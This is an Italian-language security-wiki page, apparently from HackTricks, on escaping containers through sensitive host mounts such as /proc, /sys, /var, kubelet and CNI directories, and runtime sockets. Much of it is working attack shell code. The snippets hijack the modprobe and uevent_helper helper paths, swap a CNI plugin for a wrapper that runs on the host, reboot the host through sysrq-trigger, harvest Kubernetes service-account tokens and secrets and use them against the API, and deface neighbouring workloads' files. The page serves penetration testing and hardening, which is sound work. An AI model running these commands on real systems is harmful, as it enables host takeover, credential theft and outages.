# Mount dell'host sensibili

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

I mount dell'host sono una delle superfici pratiche più importanti per il container-escape, perché spesso annullano una visualizzazione dei processi attentamente isolata, riportandola alla visibilità diretta delle risorse dell'host. I casi pericolosi non si limitano a `/`. I bind mount di `/proc`, `/sys`, `/var`, dei runtime socket, dello stato gestito da kubelet o dei path relativi ai device possono esporre controlli del kernel, credenziali, filesystem di container adiacenti e interfacce di gestione del runtime.

Questa pagina esiste separatamente dalle singole pagine sulle protezioni perché il modello di abuso è trasversale. Un mount dell'host scrivibile è pericoloso in parte a causa dei mount namespace, in parte a causa degli user namespace, in parte a causa della copertura di AppArmor o SELinux e in parte a causa dell'esatto path dell'host esposto. Trattarlo come un argomento autonomo rende la superficie d'attacco molto più facile da analizzare.

## Esposizione di `/proc`

procfs contiene sia informazioni ordinarie sui processi sia interfacce di controllo del kernel ad alto impatto. Un bind mount come `-v /proc:/host/proc` o una visualizzazione del container che espone entry proc scrivibili inaspettate può quindi portare a information disclosure, denial of service o esecuzione diretta di codice sull'host.

I path procfs di alto valore includono:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Inizia verificando quali entry procfs di alto valore sono visibili o scrivibili:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Questi percorsi sono interessanti per motivi diversi. `core_pattern`, `modprobe` e `binfmt_misc` possono diventare percorsi di code execution sull'host quando sono scrivibili. `kallsyms`, `kmsg`, `kcore` e `config.gz` sono potenti fonti di reconnaissance per il kernel exploitation. `sched_debug` e `mountinfo` rivelano informazioni su processi, cgroup e filesystem che possono aiutare a ricostruire la struttura dell'host dall'interno del container.

Il valore pratico di ciascun percorso è diverso e trattarli tutti come se avessero lo stesso impatto rende il triage più difficile:

- `/proc/sys/kernel/core_pattern`
Se scrivibile, questo è uno dei percorsi procfs con l'impatto maggiore, perché il kernel esegue un pipe handler dopo un crash. Un container che può indirizzare `core_pattern` verso un payload memorizzato nel proprio overlay o in un host path montato può spesso ottenere code execution sull'host. Vedi anche [read-only-paths.md](protections/read-only-paths.md) per un esempio dedicato.
- `/proc/sys/kernel/modprobe`
Questo percorso controlla l'helper userspace utilizzato dal kernel quando deve invocare la logica di module-loading. Se è scrivibile dal container e viene interpretato nel contesto dell'host, può diventare un altro primitive di code execution sull'host. È particolarmente interessante se combinato con un modo per attivare l'helper path.
- `/proc/sys/vm/panic_on_oom`
Di solito non è un primitive di escape pulito, ma può trasformare la memory pressure in una denial of service a livello dell'host, convertendo le condizioni OOM in un comportamento di kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se l'interfaccia di registrazione è scrivibile, l'attacker può registrare un handler per un magic value scelto e ottenere execution nel contesto dell'host quando viene eseguito un file corrispondente.
- `/proc/config.gz`
Utile per il kernel exploit triage. Aiuta a determinare quali subsystem, mitigations e feature opzionali del kernel sono abilitate senza richiedere i metadata dei package dell'host.
- `/proc/sysrq-trigger`
Principalmente un percorso di denial of service, ma molto serio. Può riavviare, mandare in panic o interrompere in altro modo l'host immediatamente.
- `/proc/kmsg`
Rivela i messaggi del kernel ring buffer. È utile per l'host fingerprinting, la crash analysis e, in alcuni ambienti, per il leak di informazioni utili al kernel exploitation.
- `/proc/kallsyms`
È prezioso quando è leggibile perché espone informazioni sui kernel symbol esportati e può aiutare a superare le ipotesi sull'address randomization durante lo sviluppo di kernel exploit.
- `/proc/[pid]/mem`
È un'interfaccia diretta alla memoria dei processi. Se il processo target è raggiungibile con le condizioni necessarie in stile ptrace, può consentire di leggere o modificare la memoria di un altro processo. L'impatto reale dipende fortemente da credentials, `hidepid`, Yama e dalle restrizioni ptrace, quindi è un percorso potente ma condizionale.
- `/proc/kcore`
Espone una vista della memoria di sistema in stile core image. Il file è enorme e difficile da usare, ma se è realmente leggibile indica una superficie di memoria dell'host esposta in modo grave.
- `/proc/kmem` e `/proc/mem`
Interfacce raw per la memoria storicamente ad alto impatto. Sui sistemi moderni spesso sono disabilitate o fortemente limitate, ma se presenti e utilizzabili devono essere trattate come finding critici.
- `/proc/sched_debug`
Fa leak di informazioni su scheduling e task che possono esporre le identità dei processi dell'host anche quando le altre viste dei processi appaiono più pulite del previsto.
- `/proc/[pid]/mountinfo`
È estremamente utile per ricostruire dove si trova realmente il container sull'host, quali percorsi sono supportati da overlay e se un mount scrivibile corrisponde a contenuti dell'host o solo al container layer.

Se `/proc/[pid]/mountinfo` o i dettagli dell'overlay sono leggibili, usali per recuperare l'host path del filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Questi comandi sono utili perché diverse tecniche di host execution richiedono di convertire un percorso all'interno del container nel percorso corrispondente dal punto di vista dell'host.

### Full Example: `modprobe` Helper Path Abuse

Se `/proc/sys/kernel/modprobe` è scrivibile dal container e il percorso dell'helper viene interpretato nel contesto dell'host, può essere reindirizzato a un payload controllato dall'attaccante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Il trigger esatto dipende dal target e dal comportamento del kernel, ma il punto importante è che un percorso helper scrivibile può reindirizzare una futura invocazione di un kernel helper verso contenuti del host controllati dall'attaccante.

### Esempio completo: ricognizione del kernel con `kallsyms`, `kmsg` e `config.gz`

Se l'obiettivo è una valutazione dell'exploitability anziché un'immediata escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Questi comandi aiutano a determinare se sono visibili informazioni utili sui simboli, se i messaggi recenti del kernel rivelano dettagli interessanti sullo stato e quali funzionalità o mitigazioni del kernel sono state incluse nella compilazione. L'impatto solitamente non consiste in un escape diretto, ma può ridurre drasticamente i tempi di triage delle vulnerabilità del kernel.

### Esempio completo: riavvio dell'host tramite SysRq

Se `/proc/sysrq-trigger` è scrivibile e raggiunge la vista dell'host:
```bash
echo b > /proc/sysrq-trigger
```
L'effetto è un riavvio immediato dell'host. Non è un esempio sottile, ma dimostra chiaramente che l'esposizione di procfs può essere molto più grave della semplice divulgazione di informazioni.

## Esposizione di `/sys`

sysfs espone grandi quantità di informazioni sullo stato del kernel e dei dispositivi. Alcuni percorsi di sysfs sono principalmente utili per il fingerprinting, mentre altri possono influire sull'esecuzione degli helper, sul comportamento dei dispositivi, sulla configurazione dei security module o sullo stato del firmware.

I percorsi sysfs di maggiore interesse includono:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Questi percorsi sono rilevanti per motivi diversi. `/sys/class/thermal` può influire sul comportamento della gestione termica e quindi sulla stabilità dell'host in ambienti con esposizione non correttamente configurata. `/sys/kernel/vmcoreinfo` può causare il leak di informazioni sui crash dump e sul layout del kernel, utili per il fingerprinting a basso livello dell'host. `/sys/kernel/security` è l'interfaccia `securityfs` utilizzata dai Linux Security Modules, quindi un accesso imprevisto potrebbe esporre o modificare lo stato relativo al MAC. I percorsi delle variabili EFI possono influire sulle impostazioni di boot supportate dal firmware, rendendoli molto più rischiosi dei normali file di configurazione. `debugfs` in `/sys/kernel/debug` è particolarmente pericoloso perché è intenzionalmente un'interfaccia orientata agli sviluppatori, con molte meno garanzie di sicurezza rispetto alle API del kernel hardened e rivolte agli ambienti di produzione.

I comandi utili per esaminare questi percorsi sono:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Cosa rende interessanti questi comandi:

- `/sys/kernel/security` può rivelare se AppArmor, SELinux o un altro LSM è esposto in un modo che avrebbe dovuto rimanere accessibile solo dall'host.
- `/sys/kernel/debug` è spesso la scoperta più allarmante di questo gruppo. Se `debugfs` è montato e accessibile in lettura o scrittura, è possibile aspettarsi un'ampia superficie di interazione con il kernel, il cui rischio esatto dipende dai nodi di debug abilitati.
- L'esposizione delle variabili EFI è meno comune, ma, se presente, ha un impatto elevato perché riguarda impostazioni supportate dal firmware anziché normali file di runtime.
- `/sys/class/thermal` è principalmente rilevante per la stabilità dell'host e l'interazione con l'hardware, non per un semplice escape tramite shell.
- `/sys/kernel/vmcoreinfo` è principalmente una fonte per il fingerprinting dell'host e l'analisi dei crash, utile per comprendere lo stato del kernel a basso livello.

### Esempio completo: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel potrebbe eseguire un helper controllato dall'attaccante quando viene attivato un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Il motivo per cui funziona è che il percorso dell'helper viene interpretato dal punto di vista dell'host. Una volta attivato, l'helper viene eseguito nel contesto dell'host anziché all'interno del container corrente.

## Esposizione di `/var`

Il mount di `/var` dell'host in un container viene spesso sottovalutato perché non appare drammatico quanto il mount di `/`. In pratica, può essere sufficiente per raggiungere runtime socket, directory degli snapshot dei container, volumi dei pod gestiti da kubelet, service-account token proiettati e filesystem delle applicazioni adiacenti. Sui nodi moderni, `/var` è spesso il percorso in cui risiede effettivamente lo stato dei container più interessante dal punto di vista operativo.

### Esempio Kubernetes

Un pod con `hostPath: /var` può spesso leggere i token proiettati degli altri pod e il contenuto degli overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Questi comandi sono utili perché indicano se il mount espone solo dati applicativi irrilevanti oppure credenziali del cluster ad alto impatto. Un service-account token leggibile può trasformare immediatamente l'esecuzione di codice locale in accesso alla Kubernetes API.

Se il token è presente, verifica a cosa può accedere invece di fermarti alla sola individuazione del token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impatto potrebbe essere molto maggiore del semplice accesso al nodo locale. Un token con RBAC ampio può trasformare un `/var` montato in una compromissione dell'intero cluster.

### Esempio Docker e containerd

Sugli host Docker, i dati rilevanti si trovano spesso sotto `/var/lib/docker`, mentre sui nodi Kubernetes basati su containerd possono trovarsi sotto `/var/lib/containerd` o in percorsi specifici dello snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se il `/var` montato espone contenuti snapshot scrivibili di un altro workload, l'attacker potrebbe riuscire ad alterare i file dell'applicazione, inserire contenuti web o modificare gli startup script senza toccare la configurazione del container corrente.

Idee concrete di abuso una volta individuati contenuti snapshot scrivibili:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Questi comandi sono utili perché mostrano le tre principali famiglie di impatto dei mount di `/var`: manomissione delle applicazioni, recupero di secret e lateral movement verso workload adiacenti.

## Stato di Kubelet, Plugin e percorsi CNI

Un mount di `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` viene spesso esposto tramite DaemonSet privilegiati, agent CNI, plugin CSI dei nodi, operatori GPU e helper dello storage. Questi mount sono facili da liquidare come semplice "infrastruttura del nodo", ma si trovano direttamente nel percorso di esecuzione dei nuovi pod e spesso contengono credenziali di kubelet, secret proiettati, socket di registrazione e binari eseguibili dei plugin lato host.

Gli obiettivi di alto valore includono:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

I comandi di revisione utili sono:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Perché questi percorsi sono importanti:

- `/var/lib/kubelet/pki` può esporre certificati client del kubelet e altre credenziali locali del nodo che, in alcuni casi, possono essere riutilizzate contro l'API server o gli endpoint TLS esposti dal kubelet, a seconda del design del cluster.
- `/var/lib/kubelet/pods` contiene spesso token degli account di servizio proiettati e Secrets montati per i pod vicini sullo stesso nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` è principalmente una superficie di ricognizione, ma molto utile: rivela quali pod e container possiedono attualmente GPU, hugepages, dispositivi SR-IOV e altre risorse locali del nodo limitate.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` rivelano quali plugin CSI, DRA e device plugin sono installati e con quali socket il kubelet dovrebbe comunicare. Se queste directory sono scrivibili anziché soltanto leggibili, il finding diventa molto più grave.
- `/opt/cni/bin` e `/etc/cni/net.d` si trovano direttamente nel percorso di configurazione della rete dei pod. L'accesso in scrittura è spesso una primitiva di esecuzione ritardata sull'host, anziché una semplice esposizione della configurazione.

### Esempio completo: Writable `/opt/cni/bin`

Se una directory degli host CNI è montata in lettura-scrittura, sostituire un plugin può essere sufficiente per ottenere l'esecuzione sull'host la volta successiva che il kubelet crea un pod sandbox su quel nodo:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Questo non è immediato quanto un `docker.sock` montato, ma è spesso più realistico nei pod di infrastruttura Kubernetes compromessi. Il punto importante è che il binary modificato viene eseguito successivamente dal flusso di configurazione della rete dell'host, non dal container corrente.


## Runtime Sockets

I mount sensibili dell'host spesso includono runtime socket anziché directory complete. Sono così importanti da meritare di essere ribaditi esplicitamente qui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Vedi [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) per i flussi completi di exploitation una volta montato uno di questi socket.

Come rapido schema di prima interazione:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se una di queste operazioni ha successo, il percorso da un "socket montato" all’avvio di un container sibling più privilegiato è solitamente molto più breve rispetto a qualsiasi percorso di breakout del kernel.

## Hijack di un task del host tramite un path scrivibile

Un mount del host scrivibile non deve necessariamente esporre `/` per essere pericoloso. Se il path montato contiene script, file di configurazione, hook, plugin o file utilizzati in seguito da un task schedulato o da un servizio lato host, il container potrebbe essere in grado di modificare ciò che il host esegue.

Flusso di revisione generico:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Se un file scrivibile viene utilizzato da un processo host, mantieni il payload semplice e osservabile durante i test:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
La parte interessante è il trust boundary: la scrittura avviene dall'interno del container, ma l'esecuzione avviene successivamente nel contesto del servizio host. Questo trasforma un hostPath ristretto o un bind mount in una primitiva di delayed host-code-execution.

## CVE relative ai mount

Gli host mount intersecano anche le vulnerabilità dei runtime. Tra gli esempi recenti più importanti:

- `CVE-2024-21626` in `runc`, dove un file descriptor di directory esposto poteva collocare la directory di lavoro sul filesystem dell'host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` in BuildKit, dove Dockerfile e frontend malevoli, nonché i flussi `RUN --mount`, potevano reintrodurre l'accesso ai file dell'host, la loro eliminazione o privilegi elevati durante le build.
- `CVE-2024-1753` nei flussi di build di Buildah e Podman, dove bind mount appositamente creati durante la build potevano esporre `/` in lettura-scrittura.
- `CVE-2025-47290` in `containerd` 2.1.0, dove una condizione TOCTOU durante l'unpack di un'immagine poteva consentire a un'immagine appositamente creata di modificare il filesystem dell'host durante il pull.

Queste CVE sono importanti in questo contesto perché mostrano che la gestione dei mount non riguarda soltanto la configurazione dell'operatore. Anche il runtime può introdurre condizioni di escape basate sui mount.

## Controlli

Usa questi comandi per individuare rapidamente le esposizioni dei mount a più alto impatto:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Cosa è interessante qui:

- La root dell'host, `/proc`, `/sys`, `/var` e i socket di runtime sono tutti elementi ad alta priorità.
- Le voci scrivibili di proc/sys spesso indicano che il mount espone controlli del kernel globali dell'host anziché una vista sicura del container.
- I percorsi `/var` montati richiedono una verifica delle credenziali e dei workload vicini, non solo un'analisi del filesystem.
- Le directory di stato di Kubelet e i percorsi CNI/plugin meritano la stessa priorità dei socket di runtime, perché spesso si trovano direttamente nel percorso di creazione dei pod e distribuzione delle credenziali sul nodo.

## Riferimenti

- [File e percorsi locali utilizzati da Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [Il container cilium-agent può accedere all'host tramite un mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
